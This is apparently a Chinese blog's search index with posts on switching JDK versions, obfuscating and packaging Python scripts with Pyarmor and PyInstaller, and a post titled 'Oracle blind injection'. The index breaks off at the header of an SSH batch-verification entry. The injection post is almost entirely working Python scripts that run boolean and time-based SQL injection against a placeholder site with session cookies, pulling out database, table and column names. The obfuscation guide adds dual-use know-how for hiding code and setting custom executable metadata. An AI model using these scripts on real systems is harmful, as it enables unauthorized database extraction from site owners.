<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JDK版本快速切换-jvms</title>
      <link href="/2025/03/11/JDK%E7%89%88%E6%9C%AC%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2/"/>
      <url>/2025/03/11/JDK%E7%89%88%E6%9C%AC%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ystyle/jvms</span><br></pre></td></tr></table></figure><h2 id="进行初始化"><a href="#进行初始化" class="headerlink" title="进行初始化"></a>进行初始化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvms.exe init</span><br></pre></td></tr></table></figure><p>把所有版本拷贝到store目录</p><p><img src="/images/JDK%E7%89%88%E6%9C%AC%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2.assets/image-20250311134414170.png" alt="image-20250311134414170"></p><h2 id="管理员身份运行cmd窗口"><a href="#管理员身份运行cmd窗口" class="headerlink" title="管理员身份运行cmd窗口"></a>管理员身份运行cmd窗口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列出可用版本</span><br><span class="line">jvms.exe ls</span><br><span class="line"></span><br><span class="line">切换版本</span><br><span class="line">jvms.exe s jdk16</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
          <category> 实用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实用工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oracle盲注</title>
      <link href="/2025/03/11/oracle%E7%9B%B2%E6%B3%A8/"/>
      <url>/2025/03/11/oracle%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>oracle 数据库名表名使用大写字母，有时使用这个就够，payload_table&#x3D;‘@ABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">payloads = &#x27;/abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.()&quot;!@#$%^&amp;*&#x27;    #匹配用的字符串</span><br><span class="line">web=&quot;http://123.com:443/123.ashx?FAppCodeType=0&amp;FProductNo=&quot;</span><br><span class="line">database=&#x27;&#x27;</span><br><span class="line">print (&#x27;Start to retrive current version:&#x27;)</span><br><span class="line">for i in range(1,25):</span><br><span class="line">        for payload in payloads:    #遍历取出字符</span><br><span class="line">                url =web+&quot;&#x27;and &#x27;ascii(substr(concat(@@basedir),%d,1))&#x27;=&#x27;%d--+&quot;%(i,ord(payload))+&quot;&amp;FType=GetAllAppCodeReport&quot;#第一个%参数为i,第二个%d参数为ord(payload)</span><br><span class="line">                #url =web+&quot; and ascii(substr(concat((select schema_name from information_schema.schemata limit 0,1)),%d,3))=%d--+&quot;%(i,ord(payload))</span><br><span class="line">                #print(requests.get(url).text)</span><br><span class="line">                contentLength = len(requests.get(url).text)</span><br><span class="line">                #print(contentLength)</span><br><span class="line">                if contentLength &gt; 37:</span><br><span class="line">                        database+=payload</span><br><span class="line">                        print (&#x27;version is:&#x27;, database)</span><br><span class="line">                        break</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">#s=requests.session()</span><br><span class="line">#payloads = &#x27;!&quot;#$%&amp;+/0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghigklmnopqrstuvwxyz&#x27;    #匹配用的字符串</span><br><span class="line">#payloads = &#x27;!&quot;#$%&amp;()*+-./0123456789:=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_abcdefghigklmnopqrstuvwxyz&#123;|&#125;~&#x27; </span><br><span class="line">payload_table=&#x27;@ABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789&#x27;</span><br><span class="line">headers=&#123;</span><br><span class="line">    &#x27;Host&#x27;:&#x27;123.com:443&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;close&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">#cookies=&#123;&#x27;EASSESSIONID&#x27;:&#x27;-275726814&#x27;,&#x27;NAPRoutID&#x27;:&#x27;-275726814&#x27;,&#x27;JSESSIONID&#x27;:&#x27;rBLINBrsXWjru-RKg2pKXkfrtznkTk7qc9AA&#x27;&#125;</span><br><span class="line">cookies=&#123;&#x27;JSESSIONID&#x27;:&#x27;78F68DABE79Asfs5B57165A9546058&#x27;&#125;</span><br><span class="line"></span><br><span class="line">web=&quot;https://123.com:443/bs/skfp?m=query&amp;taxType=0&amp;startPeriod=&amp;endPeriod=&amp;tally=0&amp;status=&amp;accountRuleId=&amp;orderField=FCREATEDATE&amp;orderDirection=asc&amp;name=%25&#x27;%20&quot;</span><br><span class="line">web2=&quot;&amp;fpType=0&amp;grType=0&amp;businessItemId=&amp;settlementItemId=&amp;goodsName=&amp;taxRate=&quot;</span><br><span class="line">requests.packages.urllib3.disable_warnings()#防止请求https输出警告</span><br><span class="line">print (&#x27;Start to retrive current :&#x27;)</span><br><span class="line"></span><br><span class="line">#（user_tables，all_tables 两种）</span><br><span class="line">database_length_load=&#x27;(SELECT+length(global_name)+FROM+global_name)&#x27;</span><br><span class="line">database_length_2=&#x27;(select+length(SYS.DATABASE_NAME)+from+(SELECT+ROWNUM+r,SYS.DATABASE_NAME+FROM+user_tables+ORDER+BY+SYS.DATABASE_NAME)+where+r=2)&#x27;</span><br><span class="line">database_length_tables_load=&#x27;(SELECT+length(table_name)+FROM+user_tables+where+rownum=1)&#x27;</span><br><span class="line">database_length_tables_load2=&#x27;(select+length(table_name)+from+(SELECT+ROWNUM+r,table_name+FROM+user_tables+ORDER+BY+table_name)+where+r=12)&#x27;    #yes</span><br><span class="line"></span><br><span class="line">database_load=&#x27;(SELECT+global_name+FROM+global_name),&#x27;</span><br><span class="line">database_load_2=&#x27;(select+SYS.DATABASE_NAME+from+(SELECT+ROWNUM+r,SYS.DATABASE_NAME+FROM+user_tables+ORDER+BY+SYS.DATABASE_NAME)+where+r=2),&#x27;</span><br><span class="line">database_tables_load=&#x27;(select+table_name+from+user_tables+where+rownum=1),&#x27;</span><br><span class="line">database_tables_load2=&#x27;(select+table_name+from+(SELECT+ROWNUM+r,table_name+FROM+user_tables+ORDER+BY+table_name)+where+r=12),&#x27;     #yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_tables_column_load=&#x27;(SELECT+column_name+FROM+all_tab_columns+where+rownum=1),&#x27;</span><br><span class="line">database_tables_column_load_2=&#x27;(SELECT+column_name+FROM+all_tab_columns+where+rownum=1+and+table_name=T_GL_ACCOUNT),&#x27;</span><br><span class="line">database_tables_column_load_3=&#x27;(select+column_name+from+(SELECT+ROWNUM+r,column_name+FROM+all_tab_columns+where+table_name=T_GL_ACCOUNT+ORDER+BY+column_name)+where+r=1),&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def length():</span><br><span class="line">    for i in range(3,22):</span><br><span class="line">        url =web+&quot;and+&quot;+database_length_tables_load2+&quot;=&quot;+str(i)+&quot;+and+&#x27;%25&#x27;=&#x27;&quot;+web2</span><br><span class="line">        rs=requests.get(url,headers=headers,cookies=cookies,verify=False)</span><br><span class="line">        rs.encoding=&#x27;utf-8&#x27;</span><br><span class="line">        #print(rs.text)</span><br><span class="line">        contentLength = len(requests.get(url,headers=headers,cookies=cookies,verify=False).text)</span><br><span class="line">        #print(contentLength,i)</span><br><span class="line">        if contentLength &gt;10000:</span><br><span class="line">            print (&#x27;length is:&#x27;, i)</span><br><span class="line">            break</span><br><span class="line">    return i</span><br><span class="line"></span><br><span class="line">def database(length):</span><br><span class="line">    tables=&#x27;&#x27;</span><br><span class="line">    for i in range(1,length+1):</span><br><span class="line">        for payload in payload_table:    #遍历取出字符</span><br><span class="line">            url =web+&quot;and+(select+decode(substr(&quot;+database_tables_column_load_2+str(i)+&quot;,1),&#x27;&quot;+payload+&quot;&#x27;,1,0)+from+dual)&gt;0+and+&#x27;%25&#x27;=&#x27;&quot;+web2##sql中&#x27;%&#x27;已识别为转义符，第一个%d参数为i,第二个%s参数为(payload)</span><br><span class="line">            rs=requests.get(url,headers=headers,cookies=cookies,verify=False)</span><br><span class="line">            rs.encoding=&#x27;utf-8&#x27;</span><br><span class="line">            #print(rs.text)</span><br><span class="line">            contentLength = len(requests.get(url,headers=headers,cookies=cookies,verify=False).text)</span><br><span class="line">            #print(contentLength,payload)</span><br><span class="line">            if contentLength &gt;10000:</span><br><span class="line">                tables+=payload</span><br><span class="line">                print (&#x27;data is:&#x27;, tables)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #length=length()</span><br><span class="line">    database(19)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">#s=requests.session()</span><br><span class="line">#payloads = &#x27;!&quot;#$%&amp;()*+-./0123456789:=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_abcdefghigklmnopqrstuvwxyz&#123;|&#125;~&#x27; </span><br><span class="line">payloads = &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.&#x27;</span><br><span class="line">headers=&#123;</span><br><span class="line">&#x27;Host&#x27;:&#x27;123.com:443&#x27;,</span><br><span class="line">&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27;,</span><br><span class="line">&#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span><br><span class="line">&#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,</span><br><span class="line">&#x27;Connection&#x27;: &#x27;close&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">cookies=&#123;&#x27;logintag&#x27;:&#x27;C4D81FDD58874D5A95BEB6A604E&#x27;,&#x27;localeId&#x27;:&#x27;2052&#x27;,&#x27;laravel_session&#x27;:&#x27;eyJpdiI6IlczVkdCcmhzVDJkZ0tVRGdYeGZ4d1E9PSIsInZhbHVlIjoiSTIyREltNFZpNjdrVlwvV3FMXC9WZjhJNEVMN28rM3Z4czV5Vnl3ZkNpVEdTWVd5RGRvZUVBV2ZCNXRasdQZTdkak1EVCthbHd0SmFwMzB2Zz09IiwibWFjIjoiYTAxYjhhN2E3YWQzMDJjZmFhNTE1YmNlZjZiY2FlYjVkMjA3ZGFjOGE1MzU2YzBjOWQxNWE5NzY3YWRjMzIyMiJ9&#x27;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web=&quot;https://123.com:443/club/pv?cDataId=1309067&amp;ct=thread&amp;en=ck&amp;pd=&quot;</span><br><span class="line">web2=&quot;&amp;s=/forum.php%3Ffid=1031%26mod=forumdisplay&quot;</span><br><span class="line">tables=&#x27;&#x27;</span><br><span class="line">print (&#x27;Start to retrive current tables:&#x27;)</span><br><span class="line">for i in range(1,7):</span><br><span class="line">        for payload in payloads:</span><br><span class="line">                startTime=time.time()</span><br><span class="line">                url =web+&#x27;if((select+ascii(substring(database(),%d,2)))=%d,sleep(5),0)&#x27;%(i,ord(payload))+web2</span><br><span class="line">                #rs=requests.get(url,headers=headers,cookies=cookies,verify=False)</span><br><span class="line">                rs=requests.get(url,timeout=6)</span><br><span class="line">                startTime2=time.time()</span><br><span class="line">                #print(payload+&#x27;-----&#x27;,startTime2-startTime)</span><br><span class="line">                if time.time() - startTime &gt; 5:</span><br><span class="line">                        tables+=payload</span><br><span class="line">                        print (&#x27;version is:&#x27;, tables)</span><br><span class="line">                        break</span><br><span class="line">                        </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python混淆和打包exe</title>
      <link href="/2025/03/11/python%E6%B7%B7%E6%B7%86%E5%92%8C%E6%89%93%E5%8C%85exe/"/>
      <url>/2025/03/11/python%E6%B7%B7%E6%B7%86%E5%92%8C%E6%89%93%E5%8C%85exe/</url>
      
        <content type="html"><![CDATA[<h2 id="Pyarmor"><a href="#Pyarmor" class="headerlink" title="Pyarmor"></a>Pyarmor</h2><p>Pyarmor是一个共享软件，试用版免费但存在功能限制（主要是加密代码不能超过 32 MB），个人够用了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyarmor</span><br></pre></td></tr></table></figure><p>混淆输出到new目录，生成混淆后的文件和pyarmor_runtime_000000目录，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyarmor gen -O new 123.py</span><br></pre></td></tr></table></figure><p><img src="/images/python%E6%B7%B7%E6%B7%86%E5%92%8C%E6%89%93%E5%8C%85exe.assets/image-20250311181506343.png" alt="image-20250311181506343"></p><p>new目录下生成混淆后的脚本和目录pyarmor_runtime_000000，可以用，带上这个目录可以直接使用</p><p><img src="/images/python%E6%B7%B7%E6%B7%86%E5%92%8C%E6%89%93%E5%8C%85exe.assets/image-20250311181827471.png" alt="image-20250311181827471"></p><p><img src="/images/python%E6%B7%B7%E6%B7%86%E5%92%8C%E6%89%93%E5%8C%85exe.assets/image-20250311181547663.png" alt="image-20250311181547663"></p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-O PATH, --output PATH</span><br><span class="line">-e 过期日期</span><br></pre></td></tr></table></figure><p>建议使用这个：<br>将30换成您希望脚本处于活动状态的天数。您也可以用一个确切的日期来代替。几天过后，脚本将过期。<br>加密脚本使用 NTP 服务器来验证是否过期，如果当前设备不能访问网络，会报错退出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyarmor gen -O aesenc -e 3 aesenc.py</span><br></pre></td></tr></table></figure><p>您可以通过设置过去的日期来测试此功能。这将使运行脚本抛出一个错误。使用以下命令用过期日期对脚本进行混淆处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyarmor gen -O aesenc -e 2022-01-01 main.py</span><br></pre></td></tr></table></figure><p>如果不需要验证网络时间，可以在有效期前面增加前缀 . 表示检查本地时间。例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyarmor gen -O dist4 -e .30 foo.py</span><br><span class="line">pyarmor gen -O dist4 -e .2020-12-31 foo.py</span><br></pre></td></tr></table></figure><p>绑定加密脚本到指定设备，如硬件信息如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IPv4:                        128.16.4.10</span><br><span class="line">Enternet Addr:               00:16:3e:35:19:3d</span><br><span class="line">Hard Disk Serial Number:     HXS2000CN2A</span><br><span class="line"></span><br><span class="line">pyarmor gen -O dist5 -b 00:16:3e:35:19:3d foo.py</span><br><span class="line">pyarmor gen -O dist5 -b 128.16.4.10 foo.py</span><br><span class="line">pyarmor gen -O dist5 -b HXS2000CN2A foo.py</span><br><span class="line">pyarmor gen -O dist5 -b &quot;00:16:3e:35:19:3d HXS2000CN2A&quot; foo.py</span><br></pre></td></tr></table></figure><h2 id="快速打包"><a href="#快速打包" class="headerlink" title="快速打包"></a>快速打包</h2><h3 id="正常打包exe"><a href="#正常打包exe" class="headerlink" title="正常打包exe:"></a>正常打包exe:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F --icon=my_icon.ico my_script.py     #加图标</span><br><span class="line"></span><br><span class="line">--noconsole  #不显示控制台</span><br><span class="line">#末尾加input代码，cmd窗口等待回车关闭</span><br><span class="line">input(&quot;等待回车关闭窗口.....&quot;)    </span><br></pre></td></tr></table></figure><h3 id="混淆后打包"><a href="#混淆后打包" class="headerlink" title="混淆后打包"></a>混淆后打包</h3><p>先把import导入包列出来，后续参数–hidden-import使用</p><p>imp.py和test.py放同一目录找出需要导的包python3 imp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#python3</span><br><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def search_files(directory, pattern):</span><br><span class="line">    matched_files = []</span><br><span class="line"></span><br><span class="line">    for root, dirs, files in os.walk(directory):</span><br><span class="line">        for file in files:</span><br><span class="line">            if file.endswith(&quot;.py&quot;):</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                with open(file_path, &quot;r&quot;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">                    lines = f.readlines()</span><br><span class="line">                    for line_num, line in enumerate(lines, start=1):</span><br><span class="line">                        match = re.search(pattern, line)</span><br><span class="line">                        if match:</span><br><span class="line">                            matched_files.append((file_path, line_num, match.group(1)))</span><br><span class="line"></span><br><span class="line">    return matched_files</span><br><span class="line"></span><br><span class="line"># 指定目录和正则表达式模式</span><br><span class="line">directory = &quot;.&quot;</span><br><span class="line">pattern = r&quot;from\s+([\w\.]+)\s+import&quot;</span><br><span class="line"></span><br><span class="line"># 调用函数搜索匹配的文件和行</span><br><span class="line">matched_files = search_files(directory, pattern)</span><br><span class="line"></span><br><span class="line">imports = []</span><br><span class="line"># 打印匹配的文件路径、行号和匹配的数据</span><br><span class="line">for file_path, line_num, data in matched_files:</span><br><span class="line">    print(f&quot;File: &#123;file_path&#125;, Line: &#123;line_num&#125;&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    if data not in imports:</span><br><span class="line">        imports.append(data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">print(&quot;--hidden-import&quot;, &quot; --hidden-import &quot;.join(imports))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="new目录执行打包"><a href="#new目录执行打包" class="headerlink" title="new目录执行打包"></a>new目录执行打包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pyinstaller -F --icon=D:\test\icon\fcp.ico --add-data &quot;pyarmor_runtime_000000;pyarmor_runtime_000000&quot; --hidden-import cryptography.hazmat.backends --hidden-import cryptography.hazmat.primitives.ciphers --hidden-import cryptography.hazmat.primitives.serialization --hidden-import cryptography.hazmat.primitives --hidden-import cryptography.hazmat.primitives.asymmetric 123.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后dist目录生成可执行文件直接使用</p><h4 id="加版本信息"><a href="#加版本信息" class="headerlink" title="加版本信息"></a>加版本信息</h4><p>修改123.spec，其中的EXE里, 这一句添加<br>version&#x3D;”file_verison_info.txt”,</p><p>file_verison_info.txt 示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># UTF-8</span><br><span class="line">#</span><br><span class="line"># For more details about fixed file info &#x27;ffi&#x27; see:</span><br><span class="line"># http://msdn.microsoft.com/en-us/library/ms646997.aspx</span><br><span class="line">VSVersionInfo(</span><br><span class="line">  ffi=FixedFileInfo(</span><br><span class="line"># filevers and prodvers should be always a tuple with four items: (1, 2, 3, 4)</span><br><span class="line"># Set not needed items to zero 0.</span><br><span class="line">filevers=(0, 0, 2, 0),  # 文件版本</span><br><span class="line">prodvers=(0, 0, 1, 0),</span><br><span class="line"># Contains a bitmask that specifies the valid bits &#x27;flags&#x27;r</span><br><span class="line">mask=0x3f,</span><br><span class="line"># Contains a bitmask that specifies the Boolean attributes of the file.</span><br><span class="line">flags=0x0,</span><br><span class="line"># The operating system for which this file was designed.</span><br><span class="line"># 0x4 - NT and there is no need to change it.</span><br><span class="line">OS=0x4,</span><br><span class="line"># The general type of file.</span><br><span class="line"># 0x1 - the file is an application.</span><br><span class="line">fileType=0x1, # 类型</span><br><span class="line"># The function of the file.</span><br><span class="line"># 0x0 - the function is not defined for this fileType</span><br><span class="line">subtype=0x0,</span><br><span class="line"># Creation date and time stamp.</span><br><span class="line">date=(0, 0)</span><br><span class="line">),</span><br><span class="line">  kids=[</span><br><span class="line">StringFileInfo(</span><br><span class="line">  [</span><br><span class="line">  StringTable(</span><br><span class="line">    u&#x27;040904B0&#x27;,</span><br><span class="line">    [StringStruct(u&#x27;CompanyName&#x27;, u&#x27;bc个人学习专用工具有限公司&#x27;), </span><br><span class="line">    StringStruct(u&#x27;FileDescription&#x27;, u&#x27;xxxxxxx工具&#x27;),    # 文件说明</span><br><span class="line">    StringStruct(u&#x27;FileVersion&#x27;, u&#x27;0.2.0&#x27;),</span><br><span class="line">    StringStruct(u&#x27;InternalName&#x27;, u&#x27;SVsfefsfN&#x27;),</span><br><span class="line">    StringStruct(u&#x27;LegalCopyright&#x27;, u&#x27;becefq个人版权所有&#x27;), #版权</span><br><span class="line">    StringStruct(u&#x27;OriginalFilename&#x27;, u&#x27;test1234.exe&#x27;), #原始文件名</span><br><span class="line">    StringStruct(u&#x27;ProductName&#x27;, u&#x27;bcewfaf&#x27;),      #产品名称</span><br><span class="line">    StringStruct(u&#x27;ProductVersion&#x27;, u&#x27;0.2.0&#x27;)])    #产品版本</span><br><span class="line">  ]),</span><br><span class="line">VarFileInfo([VarStruct(u&#x27;Translation&#x27;, [2052, 1200])]) # 语言</span><br><span class="line">  ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后重新编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller 123.spec</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH批量验证-python</title>
      <link href="/2025/03/11/ssh%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81/"/>
      <url>/2025/03/11/ssh%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81/</url>
      
